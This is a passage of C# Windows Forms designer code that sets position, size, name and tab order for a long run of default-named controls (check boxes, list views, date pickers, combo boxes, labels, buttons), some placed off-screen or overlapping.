			this.CheckedListBox11.Size = new Size(35, 4);
			this.CheckedListBox11.TabIndex = 70;
			this.MaskedTextBox5.Location = new Point(459, 311);
			this.MaskedTextBox5.Name = "MaskedTextBox5";
			this.MaskedTextBox5.Size = new Size(47, 20);
			this.MaskedTextBox5.TabIndex = 69;
			this.ListView7.HideSelection = false;
			this.ListView7.Location = new Point(128, 311);
			this.ListView7.Name = "ListView7";
			this.ListView7.Size = new Size(86, 16);
			this.ListView7.TabIndex = 68;
			this.ListView7.UseCompatibleStateImageBehavior = false;
			this.CheckBox7.AutoSize = true;
			this.CheckBox7.Location = new Point(667, 271);
			this.CheckBox7.Name = "CheckBox7";
			this.CheckBox7.Size = new Size(81, 17);
			this.CheckBox7.TabIndex = 67;
			this.CheckBox7.Text = "CheckBox7";
			this.CheckBox7.UseVisualStyleBackColor = true;
			this.MaskedTextBox6.Location = new Point(160, 123);
			this.MaskedTextBox6.Name = "MaskedTextBox6";
			this.MaskedTextBox6.Size = new Size(100, 20);
			this.MaskedTextBox6.TabIndex = 66;
			this.CheckBox8.AutoSize = true;
			this.CheckBox8.Location = new Point(39, 57);
			this.CheckBox8.Name = "CheckBox8";
			this.CheckBox8.Size = new Size(81, 17);
			this.CheckBox8.TabIndex = 65;
			this.CheckBox8.Text = "CheckBox8";
			this.CheckBox8.UseVisualStyleBackColor = true;
			this.ListView8.HideSelection = false;
			this.ListView8.Location = new Point(280, 79);
			this.ListView8.Name = "ListView8";
			this.ListView8.Size = new Size(121, 97);
			this.ListView8.TabIndex = 64;
			this.ListView8.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox12.FormattingEnabled = true;
			this.CheckedListBox12.Location = new Point(136, 99);
			this.CheckedListBox12.Name = "CheckedListBox12";
			this.CheckedListBox12.Size = new Size(120, 94);
			this.CheckedListBox12.TabIndex = 63;
			this.ComboBox6.FormattingEnabled = true;
			this.ComboBox6.Location = new Point(-16, 310);
			this.ComboBox6.Name = "ComboBox6";
			this.ComboBox6.Size = new Size(121, 21);
			this.ComboBox6.TabIndex = 62;
			this.RadioButton3.AutoSize = true;
			this.RadioButton3.Location = new Point(334, 283);
			this.RadioButton3.Name = "RadioButton3";
			this.RadioButton3.Size = new Size(90, 17);
			this.RadioButton3.TabIndex = 61;
			this.RadioButton3.TabStop = true;
			this.RadioButton3.Text = "RadioButton3";
			this.RadioButton3.UseVisualStyleBackColor = true;
			this.ProgressBar3.Location = new Point(232, 347);
			this.ProgressBar3.Name = "ProgressBar3";
			this.ProgressBar3.Size = new Size(100, 23);
			this.ProgressBar3.TabIndex = 60;
			this.Button3.Location = new Point(615, 225);
			this.Button3.Name = "Button3";
			this.Button3.Size = new Size(75, 23);
			this.Button3.TabIndex = 59;
			this.Button3.Text = "Button3";
			this.Button3.UseVisualStyleBackColor = true;
			this.CheckBox9.AutoSize = true;
			this.CheckBox9.Location = new Point(479, 250);
			this.CheckBox9.Name = "CheckBox9";
			this.CheckBox9.Size = new Size(81, 17);
			this.CheckBox9.TabIndex = 58;
			this.CheckBox9.Text = "CheckBox9";
			this.CheckBox9.UseVisualStyleBackColor = true;
			this.DateTimePicker8.Location = new Point(441, 169);
			this.DateTimePicker8.Name = "DateTimePicker8";
			this.DateTimePicker8.Size = new Size(200, 20);
			this.DateTimePicker8.TabIndex = 57;
			this.DateTimePicker9.Location = new Point(506, 279);
			this.DateTimePicker9.Name = "DateTimePicker9";
			this.DateTimePicker9.Size = new Size(200, 20);
			this.DateTimePicker9.TabIndex = 56;
			this.MonthCalendar3.Location = new Point(451, 22);
			this.MonthCalendar3.Name = "MonthCalendar3";
			this.MonthCalendar3.TabIndex = 55;
			this.Label6.AutoSize = true;
			this.Label6.Location = new Point(599, 250);
			this.Label6.Name = "Label6";
			this.Label6.Size = new Size(39, 13);
			this.Label6.TabIndex = 54;
			this.Label6.Text = "Label6";
			this.ListView9.HideSelection = false;
			this.ListView9.Location = new Point(646, 125);
			this.ListView9.Name = "ListView9";
			this.ListView9.Size = new Size(8, 8);
			this.ListView9.TabIndex = 53;
			this.ListView9.UseCompatibleStateImageBehavior = false;
			this.PictureBox3.Location = new Point(334, 244);
			this.PictureBox3.Name = "PictureBox3";
			this.PictureBox3.Size = new Size(100, 50);
			this.PictureBox3.TabIndex = 52;
			this.PictureBox3.TabStop = false;
			this.CheckedListBox13.FormattingEnabled = true;
			this.CheckedListBox13.Location = new Point(406, -15);
			this.CheckedListBox13.Name = "CheckedListBox13";
			this.CheckedListBox13.Size = new Size(120, 94);
			this.CheckedListBox13.TabIndex = 99;
			this.CheckedListBox14.FormattingEnabled = true;
			this.CheckedListBox14.Location = new Point(807, 109);
			this.CheckedListBox14.Name = "CheckedListBox14";
			this.CheckedListBox14.Size = new Size(8, 4);
			this.CheckedListBox14.TabIndex = 98;
			this.Label7.AutoSize = true;
			this.Label7.Location = new Point(722, 175);
			this.Label7.Name = "Label7";
			this.Label7.Size = new Size(39, 13);
			this.Label7.TabIndex = 97;
			this.Label7.Text = "Label7";
			this.DateTimePicker10.Location = new Point(677, 239);
			this.DateTimePicker10.Name = "DateTimePicker10";
			this.DateTimePicker10.Size = new Size(25, 20);
			this.DateTimePicker10.TabIndex = 96;
			this.ComboBox7.FormattingEnabled = true;
			this.ComboBox7.Location = new Point(661, 128);
			this.ComboBox7.Name = "ComboBox7";
			this.ComboBox7.Size = new Size(33, 21);
			this.ComboBox7.TabIndex = 95;
			this.CheckedListBox15.FormattingEnabled = true;
			this.CheckedListBox15.Location = new Point(531, 128);
			this.CheckedListBox15.Name = "CheckedListBox15";
			this.CheckedListBox15.Size = new Size(35, 4);
			this.CheckedListBox15.TabIndex = 94;
			this.MaskedTextBox7.Location = new Point(760, 251);
			this.MaskedTextBox7.Name = "MaskedTextBox7";
			this.MaskedTextBox7.Size = new Size(47, 20);
			this.MaskedTextBox7.TabIndex = 93;
			this.ListView10.HideSelection = false;
			this.ListView10.Location = new Point(429, 251);
			this.ListView10.Name = "ListView10";
			this.ListView10.Size = new Size(86, 16);
			this.ListView10.TabIndex = 92;
			this.ListView10.UseCompatibleStateImageBehavior = false;
			this.CheckBox10.AutoSize = true;
			this.CheckBox10.Location = new Point(968, 211);
			this.CheckBox10.Name = "CheckBox10";
			this.CheckBox10.Size = new Size(87, 17);
			this.CheckBox10.TabIndex = 91;
			this.CheckBox10.Text = "CheckBox10";
			this.CheckBox10.UseVisualStyleBackColor = true;
			this.MaskedTextBox8.Location = new Point(461, 63);
			this.MaskedTextBox8.Name = "MaskedTextBox8";
			this.MaskedTextBox8.Size = new Size(100, 20);
			this.MaskedTextBox8.TabIndex = 90;
			this.CheckBox11.AutoSize = true;
			this.CheckBox11.Location = new Point(340, -3);
			this.CheckBox11.Name = "CheckBox11";
			this.CheckBox11.Size = new Size(87, 17);
			this.CheckBox11.TabIndex = 89;
			this.CheckBox11.Text = "CheckBox11";
			this.CheckBox11.UseVisualStyleBackColor = true;
			this.ListView11.HideSelection = false;
			this.ListView11.Location = new Point(445, 47);
			this.ListView11.Name = "ListView11";
			this.ListView11.Size = new Size(121, 97);
			this.ListView11.TabIndex = 88;
			this.ListView11.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox16.FormattingEnabled = true;
			this.CheckedListBox16.Location = new Point(437, 39);
			this.CheckedListBox16.Name = "CheckedListBox16";
			this.CheckedListBox16.Size = new Size(120, 94);
			this.CheckedListBox16.TabIndex = 87;
			this.ComboBox8.FormattingEnabled = true;
			this.ComboBox8.Location = new Point(446, 166);
			this.ComboBox8.Name = "ComboBox8";
			this.ComboBox8.Size = new Size(121, 21);
			this.ComboBox8.TabIndex = 86;
			this.RadioButton4.AutoSize = true;
			this.RadioButton4.Location = new Point(635, 223);
			this.RadioButton4.Name = "RadioButton4";
			this.RadioButton4.Size = new Size(90, 17);
			this.RadioButton4.TabIndex = 85;
			this.RadioButton4.TabStop = true;
			this.RadioButton4.Text = "RadioButton4";
			this.RadioButton4.UseVisualStyleBackColor = true;
			this.ProgressBar4.Location = new Point(533, 287);
			this.ProgressBar4.Name = "ProgressBar4";
			this.ProgressBar4.Size = new Size(100, 23);
			this.ProgressBar4.TabIndex = 84;
			this.Button4.Location = new Point(916, 165);
			this.Button4.Name = "Button4";
			this.Button4.Size = new Size(75, 23);
			this.Button4.TabIndex = 83;
			this.Button4.Text = "Button4";
			this.Button4.UseVisualStyleBackColor = true;
			this.CheckBox12.AutoSize = true;
			this.CheckBox12.Location = new Point(780, 190);
			this.CheckBox12.Name = "CheckBox12";
			this.CheckBox12.Size = new Size(87, 17);
			this.CheckBox12.TabIndex = 82;
			this.CheckBox12.Text = "CheckBox12";
			this.CheckBox12.UseVisualStyleBackColor = true;
			this.DateTimePicker11.Location = new Point(742, 109);
			this.DateTimePicker11.Name = "DateTimePicker11";
			this.DateTimePicker11.Size = new Size(200, 20);
			this.DateTimePicker11.TabIndex = 81;
			this.DateTimePicker12.Location = new Point(807, 219);
			this.DateTimePicker12.Name = "DateTimePicker12";
			this.DateTimePicker12.Size = new Size(200, 20);
			this.DateTimePicker12.TabIndex = 80;
			this.MonthCalendar4.Location = new Point(464, 49);
			this.MonthCalendar4.Name = "MonthCalendar4";
			this.MonthCalendar4.TabIndex = 79;
			this.Label8.AutoSize = true;
			this.Label8.Location = new Point(900, 190);
			this.Label8.Name = "Label8";
			this.Label8.Size = new Size(39, 13);
			this.Label8.TabIndex = 78;
			this.Label8.Text = "Label8";
			this.ListView12.HideSelection = false;
			this.ListView12.Location = new Point(947, 65);
			this.ListView12.Name = "ListView12";
			this.ListView12.Size = new Size(8, 8);
			this.ListView12.TabIndex = 77;
			this.ListView12.UseCompatibleStateImageBehavior = false;
			this.PictureBox4.Location = new Point(661, 215);
			this.PictureBox4.Name = "PictureBox4";
			this.PictureBox4.Size = new Size(100, 50);
			this.PictureBox4.TabIndex = 76;
			this.PictureBox4.TabStop = false;
			this.CheckedListBox17.FormattingEnabled = true;
			this.CheckedListBox17.Location = new Point(328, 7);
			this.CheckedListBox17.Name = "CheckedListBox17";
			this.CheckedListBox17.Size = new Size(120, 94);
			this.CheckedListBox17.TabIndex = 186;
			this.Label9.AutoSize = true;
			this.Label9.Location = new Point(644, 197);
			this.Label9.Name = "Label9";
			this.Label9.Size = new Size(39, 13);
			this.Label9.TabIndex = 185;
			this.Label9.Text = "Label9";
			this.DateTimePicker13.Location = new Point(599, 261);
			this.DateTimePicker13.Name = "DateTimePicker13";
			this.DateTimePicker13.Size = new Size(25, 20);
			this.DateTimePicker13.TabIndex = 184;
			this.ComboBox9.FormattingEnabled = true;
			this.ComboBox9.Location = new Point(583, 150);
			this.ComboBox9.Name = "ComboBox9";
			this.ComboBox9.Size = new Size(33, 21);
			this.ComboBox9.TabIndex = 183;
			this.CheckedListBox18.FormattingEnabled = true;
			this.CheckedListBox18.Location = new Point(453, 150);
			this.CheckedListBox18.Name = "CheckedListBox18";
			this.CheckedListBox18.Size = new Size(35, 4);
			this.CheckedListBox18.TabIndex = 182;
			this.ListView13.HideSelection = false;
			this.ListView13.Location = new Point(351, 273);
			this.ListView13.Name = "ListView13";
			this.ListView13.Size = new Size(86, 16);
			this.ListView13.TabIndex = 181;
			this.ListView13.UseCompatibleStateImageBehavior = false;
			this.MaskedTextBox9.Location = new Point(383, 85);
			this.MaskedTextBox9.Name = "MaskedTextBox9";
			this.MaskedTextBox9.Size = new Size(100, 20);
			this.MaskedTextBox9.TabIndex = 180;
			this.ListView14.HideSelection = false;
			this.ListView14.Location = new Point(367, 69);
			this.ListView14.Name = "ListView14";
			this.ListView14.Size = new Size(121, 97);
			this.ListView14.TabIndex = 179;
			this.ListView14.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox19.FormattingEnabled = true;
			this.CheckedListBox19.Location = new Point(359, 61);
			this.CheckedListBox19.Name = "CheckedListBox19";
			this.CheckedListBox19.Size = new Size(120, 94);
			this.CheckedListBox19.TabIndex = 178;
			this.ComboBox10.FormattingEnabled = true;
			this.ComboBox10.Location = new Point(368, 188);
			this.ComboBox10.Name = "ComboBox10";
			this.ComboBox10.Size = new Size(121, 21);
			this.ComboBox10.TabIndex = 177;
			this.RadioButton5.AutoSize = true;
			this.RadioButton5.Location = new Point(557, 245);
			this.RadioButton5.Name = "RadioButton5";
			this.RadioButton5.Size = new Size(90, 17);
			this.RadioButton5.TabIndex = 176;
			this.RadioButton5.TabStop = true;
			this.RadioButton5.Text = "RadioButton5";
			this.RadioButton5.UseVisualStyleBackColor = true;
			this.ProgressBar5.Location = new Point(455, 309);
			this.ProgressBar5.Name = "ProgressBar5";
			this.ProgressBar5.Size = new Size(100, 23);
			this.ProgressBar5.TabIndex = 175;
			this.DateTimePicker14.Location = new Point(664, 131);
			this.DateTimePicker14.Name = "DateTimePicker14";
			this.DateTimePicker14.Size = new Size(200, 20);
			this.DateTimePicker14.TabIndex = 174;
			this.MonthCalendar5.Location = new Point(386, 71);
			this.MonthCalendar5.Name = "MonthCalendar5";
			this.MonthCalendar5.TabIndex = 173;
			this.PictureBox5.Location = new Point(583, 237);
			this.PictureBox5.Name = "PictureBox5";
			this.PictureBox5.Size = new Size(100, 50);
			this.PictureBox5.TabIndex = 172;
			this.PictureBox5.TabStop = false;
			this.CheckedListBox20.FormattingEnabled = true;
			this.CheckedListBox20.Location = new Point(27, 67);
			this.CheckedListBox20.Name = "CheckedListBox20";
			this.CheckedListBox20.Size = new Size(120, 94);
			this.CheckedListBox20.TabIndex = 171;
			this.CheckedListBox21.FormattingEnabled = true;
			this.CheckedListBox21.Location = new Point(428, 191);
			this.CheckedListBox21.Name = "CheckedListBox21";
			this.CheckedListBox21.Size = new Size(8, 4);
			this.CheckedListBox21.TabIndex = 170;
			this.Label10.AutoSize = true;
			this.Label10.Location = new Point(343, 257);
			this.Label10.Name = "Label10";
			this.Label10.Size = new Size(45, 13);
			this.Label10.TabIndex = 169;
			this.Label10.Text = "Label10";
			this.DateTimePicker15.Location = new Point(298, 321);
			this.DateTimePicker15.Name = "DateTimePicker15";
			this.DateTimePicker15.Size = new Size(25, 20);
			this.DateTimePicker15.TabIndex = 168;
			this.ComboBox11.FormattingEnabled = true;
			this.ComboBox11.Location = new Point(282, 210);
			this.ComboBox11.Name = "ComboBox11";
			this.ComboBox11.Size = new Size(33, 21);
			this.ComboBox11.TabIndex = 167;
			this.CheckedListBox22.FormattingEnabled = true;
			this.CheckedListBox22.Location = new Point(152, 210);
			this.CheckedListBox22.Name = "CheckedListBox22";
			this.CheckedListBox22.Size = new Size(35, 4);
			this.CheckedListBox22.TabIndex = 166;
			this.MaskedTextBox10.Location = new Point(381, 333);
			this.MaskedTextBox10.Name = "MaskedTextBox10";
			this.MaskedTextBox10.Size = new Size(47, 20);
			this.MaskedTextBox10.TabIndex = 165;
			this.ListView15.HideSelection = false;
			this.ListView15.Location = new Point(50, 333);
			this.ListView15.Name = "ListView15";
			this.ListView15.Size = new Size(86, 16);
			this.ListView15.TabIndex = 164;
			this.ListView15.UseCompatibleStateImageBehavior = false;
			this.CheckBox13.AutoSize = true;
			this.CheckBox13.Location = new Point(589, 293);
			this.CheckBox13.Name = "CheckBox13";
			this.CheckBox13.Size = new Size(87, 17);
			this.CheckBox13.TabIndex = 163;
			this.CheckBox13.Text = "CheckBox13";
			this.CheckBox13.UseVisualStyleBackColor = true;
			this.MaskedTextBox11.Location = new Point(82, 145);
			this.MaskedTextBox11.Name = "MaskedTextBox11";
			this.MaskedTextBox11.Size = new Size(100, 20);
			this.MaskedTextBox11.TabIndex = 162;
			this.CheckBox14.AutoSize = true;
			this.CheckBox14.Location = new Point(-39, 79);
			this.CheckBox14.Name = "CheckBox14";
			this.CheckBox14.Size = new Size(87, 17);
			this.CheckBox14.TabIndex = 161;
			this.CheckBox14.Text = "CheckBox14";
			this.CheckBox14.UseVisualStyleBackColor = true;
			this.ListView16.HideSelection = false;
			this.ListView16.Location = new Point(202, 101);
			this.ListView16.Name = "ListView16";
			this.ListView16.Size = new Size(121, 97);
			this.ListView16.TabIndex = 160;
			this.ListView16.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox23.FormattingEnabled = true;
			this.CheckedListBox23.Location = new Point(58, 121);
			this.CheckedListBox23.Name = "CheckedListBox23";
			this.CheckedListBox23.Size = new Size(120, 94);
			this.CheckedListBox23.TabIndex = 159;
			this.ComboBox12.FormattingEnabled = true;
			this.ComboBox12.Location = new Point(-94, 332);
			this.ComboBox12.Name = "ComboBox12";
			this.ComboBox12.Size = new Size(121, 21);
			this.ComboBox12.TabIndex = 158;
			this.RadioButton6.AutoSize = true;
			this.RadioButton6.Location = new Point(256, 305);
			this.RadioButton6.Name = "RadioButton6";
			this.RadioButton6.Size = new Size(90, 17);
			this.RadioButton6.TabIndex = 157;
			this.RadioButton6.TabStop = true;
			this.RadioButton6.Text = "RadioButton6";
			this.RadioButton6.UseVisualStyleBackColor = true;
			this.ProgressBar6.Location = new Point(154, 369);
			this.ProgressBar6.Name = "ProgressBar6";
			this.ProgressBar6.Size = new Size(100, 23);
			this.ProgressBar6.TabIndex = 156;
			this.Button5.Location = new Point(537, 247);
			this.Button5.Name = "Button5";
			this.Button5.Size = new Size(75, 23);
			this.Button5.TabIndex = 155;
			this.Button5.Text = "Button5";
			this.Button5.UseVisualStyleBackColor = true;
			this.CheckBox15.AutoSize = true;
			this.CheckBox15.Location = new Point(401, 272);
			this.CheckBox15.Name = "CheckBox15";
			this.CheckBox15.Size = new Size(87, 17);
			this.CheckBox15.TabIndex = 154;
			this.CheckBox15.Text = "CheckBox15";
			this.CheckBox15.UseVisualStyleBackColor = true;
			this.DateTimePicker16.Location = new Point(363, 191);
			this.DateTimePicker16.Name = "DateTimePicker16";
			this.DateTimePicker16.Size = new Size(200, 20);
			this.DateTimePicker16.TabIndex = 153;
			this.DateTimePicker17.Location = new Point(428, 301);
			this.DateTimePicker17.Name = "DateTimePicker17";
			this.DateTimePicker17.Size = new Size(200, 20);
			this.DateTimePicker17.TabIndex = 152;
			this.MonthCalendar6.Location = new Point(373, 44);
			this.MonthCalendar6.Name = "MonthCalendar6";
			this.MonthCalendar6.TabIndex = 151;
			this.Label11.AutoSize = true;
			this.Label11.Location = new Point(521, 272);
			this.Label11.Name = "Label11";
			this.Label11.Size = new Size(45, 13);
			this.Label11.TabIndex = 150;
			this.Label11.Text = "Label11";
			this.ListView17.HideSelection = false;
			this.ListView17.Location = new Point(568, 147);
			this.ListView17.Name = "ListView17";
			this.ListView17.Size = new Size(8, 8);
			this.ListView17.TabIndex = 149;
			this.ListView17.UseCompatibleStateImageBehavior = false;
			this.PictureBox6.Location = new Point(256, 266);
			this.PictureBox6.Name = "PictureBox6";
			this.PictureBox6.Size = new Size(100, 50);
			this.PictureBox6.TabIndex = 148;
			this.PictureBox6.TabStop = false;
			this.CheckedListBox24.FormattingEnabled = true;
			this.CheckedListBox24.Location = new Point(19, 59);
			this.CheckedListBox24.Name = "CheckedListBox24";
			this.CheckedListBox24.Size = new Size(120, 94);
			this.CheckedListBox24.TabIndex = 147;
			this.CheckedListBox25.FormattingEnabled = true;
			this.CheckedListBox25.Location = new Point(420, 183);
			this.CheckedListBox25.Name = "CheckedListBox25";
			this.CheckedListBox25.Size = new Size(8, 4);
			this.CheckedListBox25.TabIndex = 146;
			this.Label12.AutoSize = true;
			this.Label12.Location = new Point(335, 249);
			this.Label12.Name = "Label12";
			this.Label12.Size = new Size(45, 13);
			this.Label12.TabIndex = 145;
			this.Label12.Text = "Label12";
			this.DateTimePicker18.Location = new Point(290, 313);
			this.DateTimePicker18.Name = "DateTimePicker18";
			this.DateTimePicker18.Size = new Size(25, 20);
			this.DateTimePicker18.TabIndex = 144;
			this.ComboBox13.FormattingEnabled = true;
			this.ComboBox13.Location = new Point(274, 202);
			this.ComboBox13.Name = "ComboBox13";
			this.ComboBox13.Size = new Size(33, 21);
			this.ComboBox13.TabIndex = 143;
			this.CheckedListBox26.FormattingEnabled = true;
			this.CheckedListBox26.Location = new Point(144, 202);
			this.CheckedListBox26.Name = "CheckedListBox26";
			this.CheckedListBox26.Size = new Size(35, 4);
			this.CheckedListBox26.TabIndex = 142;
			this.MaskedTextBox12.Location = new Point(373, 325);
			this.MaskedTextBox12.Name = "MaskedTextBox12";
			this.MaskedTextBox12.Size = new Size(47, 20);
			this.MaskedTextBox12.TabIndex = 141;
			this.ListView18.HideSelection = false;
			this.ListView18.Location = new Point(42, 325);
			this.ListView18.Name = "ListView18";
			this.ListView18.Size = new Size(86, 16);
			this.ListView18.TabIndex = 140;
			this.ListView18.UseCompatibleStateImageBehavior = false;
			this.CheckBox16.AutoSize = true;
			this.CheckBox16.Location = new Point(581, 285);
			this.CheckBox16.Name = "CheckBox16";
			this.CheckBox16.Size = new Size(87, 17);
			this.CheckBox16.TabIndex = 139;
			this.CheckBox16.Text = "CheckBox16";
			this.CheckBox16.UseVisualStyleBackColor = true;
			this.MaskedTextBox13.Location = new Point(74, 137);
			this.MaskedTextBox13.Name = "MaskedTextBox13";
			this.MaskedTextBox13.Size = new Size(100, 20);
			this.MaskedTextBox13.TabIndex = 138;
			this.CheckBox17.AutoSize = true;
			this.CheckBox17.Location = new Point(-47, 71);
			this.CheckBox17.Name = "CheckBox17";
			this.CheckBox17.Size = new Size(87, 17);
			this.CheckBox17.TabIndex = 137;
			this.CheckBox17.Text = "CheckBox17";
			this.CheckBox17.UseVisualStyleBackColor = true;
			this.ListView19.HideSelection = false;
			this.ListView19.Location = new Point(58, 121);
			this.ListView19.Name = "ListView19";
			this.ListView19.Size = new Size(121, 97);
			this.ListView19.TabIndex = 136;
			this.ListView19.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox27.FormattingEnabled = true;
			this.CheckedListBox27.Location = new Point(50, 113);
			this.CheckedListBox27.Name = "CheckedListBox27";
			this.CheckedListBox27.Size = new Size(120, 94);
			this.CheckedListBox27.TabIndex = 135;
			this.ComboBox14.FormattingEnabled = true;
			this.ComboBox14.Location = new Point(59, 240);
			this.ComboBox14.Name = "ComboBox14";
			this.ComboBox14.Size = new Size(121, 21);
			this.ComboBox14.TabIndex = 134;
			this.RadioButton7.AutoSize = true;
			this.RadioButton7.Location = new Point(248, 297);
			this.RadioButton7.Name = "RadioButton7";
			this.RadioButton7.Size = new Size(90, 17);
			this.RadioButton7.TabIndex = 133;
			this.RadioButton7.TabStop = true;
			this.RadioButton7.Text = "RadioButton7";
			this.RadioButton7.UseVisualStyleBackColor = true;
			this.ProgressBar7.Location = new Point(200, 276);
			this.ProgressBar7.Name = "ProgressBar7";
			this.ProgressBar7.Size = new Size(100, 23);
			this.ProgressBar7.TabIndex = 132;
			this.Button6.Location = new Point(529, 239);
			this.Button6.Name = "Button6";
			this.Button6.Size = new Size(75, 23);
			this.Button6.TabIndex = 131;
			this.Button6.Text = "Button6";
			this.Button6.UseVisualStyleBackColor = true;
			this.CheckBox18.AutoSize = true;
			this.CheckBox18.Location = new Point(393, 264);
			this.CheckBox18.Name = "CheckBox18";
			this.CheckBox18.Size = new Size(87, 17);
			this.CheckBox18.TabIndex = 130;
			this.CheckBox18.Text = "CheckBox18";
			this.CheckBox18.UseVisualStyleBackColor = true;
			this.DateTimePicker19.Location = new Point(355, 183);
			this.DateTimePicker19.Name = "DateTimePicker19";
			this.DateTimePicker19.Size = new Size(200, 20);
			this.DateTimePicker19.TabIndex = 129;
			this.DateTimePicker20.Location = new Point(331, 245);
			this.DateTimePicker20.Name = "DateTimePicker20";
			this.DateTimePicker20.Size = new Size(200, 20);
			this.DateTimePicker20.TabIndex = 128;
			this.MonthCalendar7.Location = new Point(-5, 94);
			this.MonthCalendar7.Name = "MonthCalendar7";
			this.MonthCalendar7.TabIndex = 127;
			this.Label13.AutoSize = true;
			this.Label13.Location = new Point(513, 264);
			this.Label13.Name = "Label13";
			this.Label13.Size = new Size(45, 13);
			this.Label13.TabIndex = 126;
			this.Label13.Text = "Label13";
			this.ListView20.HideSelection = false;
			this.ListView20.Location = new Point(560, 139);
			this.ListView20.Name = "ListView20";
			this.ListView20.Size = new Size(8, 8);
			this.ListView20.TabIndex = 125;
			this.ListView20.UseCompatibleStateImageBehavior = false;
			this.PictureBox7.Location = new Point(274, 289);
			this.PictureBox7.Name = "PictureBox7";
			this.PictureBox7.Size = new Size(100, 50);
			this.PictureBox7.TabIndex = 124;
			this.PictureBox7.TabStop = false;
			this.CheckedListBox28.FormattingEnabled = true;
			this.CheckedListBox28.Location = new Point(12, 34);
			this.CheckedListBox28.Name = "CheckedListBox28";
			this.CheckedListBox28.Size = new Size(120, 94);
			this.CheckedListBox28.TabIndex = 123;
			this.CheckedListBox29.FormattingEnabled = true;
			this.CheckedListBox29.Location = new Point(413, 158);
			this.CheckedListBox29.Name = "CheckedListBox29";
			this.CheckedListBox29.Size = new Size(8, 4);
			this.CheckedListBox29.TabIndex = 122;
			this.Label14.AutoSize = true;
			this.Label14.Location = new Point(328, 224);
			this.Label14.Name = "Label14";
			this.Label14.Size = new Size(45, 13);
			this.Label14.TabIndex = 121;
			this.Label14.Text = "Label14";
			this.DateTimePicker21.Location = new Point(283, 288);
			this.DateTimePicker21.Name = "DateTimePicker21";
			this.DateTimePicker21.Size = new Size(25, 20);
			this.DateTimePicker21.TabIndex = 120;
			this.ComboBox15.FormattingEnabled = true;
			this.ComboBox15.Location = new Point(267, 177);
			this.ComboBox15.Name = "ComboBox15";
			this.ComboBox15.Size = new Size(33, 21);
			this.ComboBox15.TabIndex = 119;
			this.CheckedListBox30.FormattingEnabled = true;
			this.CheckedListBox30.Location = new Point(137, 177);
			this.CheckedListBox30.Name = "CheckedListBox30";
			this.CheckedListBox30.Size = new Size(35, 4);
			this.CheckedListBox30.TabIndex = 118;
			this.MaskedTextBox14.Location = new Point(366, 300);
			this.MaskedTextBox14.Name = "MaskedTextBox14";
			this.MaskedTextBox14.Size = new Size(47, 20);
			this.MaskedTextBox14.TabIndex = 117;
			this.ListView21.HideSelection = false;
			this.ListView21.Location = new Point(35, 300);
			this.ListView21.Name = "ListView21";
			this.ListView21.Size = new Size(86, 16);
			this.ListView21.TabIndex = 116;
			this.ListView21.UseCompatibleStateImageBehavior = false;
			this.CheckBox19.AutoSize = true;
			this.CheckBox19.Location = new Point(574, 260);
			this.CheckBox19.Name = "CheckBox19";
			this.CheckBox19.Size = new Size(87, 17);
			this.CheckBox19.TabIndex = 115;
			this.CheckBox19.Text = "CheckBox19";
			this.CheckBox19.UseVisualStyleBackColor = true;
			this.MaskedTextBox15.Location = new Point(67, 112);
			this.MaskedTextBox15.Name = "MaskedTextBox15";
			this.MaskedTextBox15.Size = new Size(100, 20);
			this.MaskedTextBox15.TabIndex = 114;
			this.CheckBox20.AutoSize = true;
			this.CheckBox20.Location = new Point(-54, 46);
			this.CheckBox20.Name = "CheckBox20";
			this.CheckBox20.Size = new Size(87, 17);
			this.CheckBox20.TabIndex = 113;
			this.CheckBox20.Text = "CheckBox20";
			this.CheckBox20.UseVisualStyleBackColor = true;
			this.ListView22.HideSelection = false;
			this.ListView22.Location = new Point(51, 96);
			this.ListView22.Name = "ListView22";
			this.ListView22.Size = new Size(121, 97);
			this.ListView22.TabIndex = 112;
			this.ListView22.UseCompatibleStateImageBehavior = false;
			this.CheckedListBox31.FormattingEnabled = true;
			this.CheckedListBox31.Location = new Point(43, 88);
			this.CheckedListBox31.Name = "CheckedListBox31";
			this.CheckedListBox31.Size = new Size(120, 94);
			this.CheckedListBox31.TabIndex = 111;
			this.ComboBox16.FormattingEnabled = true;
			this.ComboBox16.Location = new Point(52, 215);
			this.ComboBox16.Name = "ComboBox16";
			this.ComboBox16.Size = new Size(121, 21);
			this.ComboBox16.TabIndex = 110;
			this.RadioButton8.AutoSize = true;
			this.RadioButton8.Location = new Point(241, 272);
			this.RadioButton8.Name = "RadioButton8";
			this.RadioButton8.Size = new Size(90, 17);
			this.RadioButton8.TabIndex = 109;
			this.RadioButton8.TabStop = true;
			this.RadioButton8.Text = "RadioButton8";
			this.RadioButton8.UseVisualStyleBackColor = true;
			this.ProgressBar8.Location = new Point(161, 257);
			this.ProgressBar8.Name = "ProgressBar8";
			this.ProgressBar8.Size = new Size(100, 23);
			this.ProgressBar8.TabIndex = 108;
			this.Button7.Location = new Point(522, 214);
			this.Button7.Name = "Button7";
			this.Button7.Size = new Size(75, 23);
			this.Button7.TabIndex = 107;
			this.Button7.Text = "Button7";
			this.Button7.UseVisualStyleBackColor = true;
			this.CheckBox21.AutoSize = true;
			this.CheckBox21.Location = new Point(386, 239);
			this.CheckBox21.Name = "CheckBox21";
			this.CheckBox21.Size = new Size(87, 17);
			this.CheckBox21.TabIndex = 106;
			this.CheckBox21.Text = "CheckBox21";
			this.CheckBox21.UseVisualStyleBackColor = true;
			this.DateTimePicker22.Location = new Point(348, 158);
			this.DateTimePicker22.Name = "DateTimePicker22";
			this.DateTimePicker22.Size = new Size(200, 20);
			this.DateTimePicker22.TabIndex = 105;
			this.DateTimePicker23.Location = new Point(413, 268);
			this.DateTimePicker23.Name = "DateTimePicker23";
			this.DateTimePicker23.Size = new Size(200, 20);
			this.DateTimePicker23.TabIndex = 104;
			this.MonthCalendar8.Location = new Point(-5, 191);
			this.MonthCalendar8.Name = "MonthCalendar8";
			this.MonthCalendar8.TabIndex = 103;
			this.Label15.AutoSize = true;
			this.Label15.Location = new Point(506, 239);
			this.Label15.Name = "Label15";
			this.Label15.Size = new Size(45, 13);
			this.Label15.TabIndex = 102;
			this.Label15.Text = "Label15";
			this.ListView23.HideSelection = false;
			this.ListView23.Location = new Point(553, 114);
			this.ListView23.Name = "ListView23";
			this.ListView23.Size = new Size(8, 8);
			this.ListView23.TabIndex = 101;
			this.ListView23.UseCompatibleStateImageBehavior = false;
